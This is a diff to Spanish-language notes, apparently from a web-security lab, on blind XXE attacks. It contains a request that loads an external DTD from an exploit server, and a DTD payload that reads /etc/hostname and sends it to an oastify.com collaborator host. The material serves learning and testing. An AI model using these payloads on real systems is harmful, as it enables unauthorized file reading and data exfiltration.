@@ -200,16 +200,17 @@ XInclude permite incluir contenido de otros recursos XML/texto en el documento u
 
 **Petición**:
 
+>!Importante: aunque ponga XML parser error, mirar los log del exploit server para ver si esta haciendose la petición
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-server/.../exploit"> %xxe;]>
+<!DOCTYPE foo [
+    <!ENTITY % xxe SYSTEM "https://exploit-0af6000703efbb0780c398f1012c0014.exploit-server.net/exploit">
+    %xxe;
+]>
 <stockCheck>
-    <productId>
-         1
-    </productId>
-    <storeId>
-         1
-    </storeId>
+    <productId>1</productId>
+    <storeId>1</storeId>
 </stockCheck>
 ```
 
@@ -217,7 +218,7 @@ XInclude permite incluir contenido de otros recursos XML/texto en el documento u
 
 ```
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'https://o0p61i7o7awzy69h69j7syoocfi665uu.oastify.com/?data=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://t2w1dotnosywwi4qeqfo20u24takynmc.oastify.com/?data=%file;'>">
 %eval;
 %exfil;
 ```
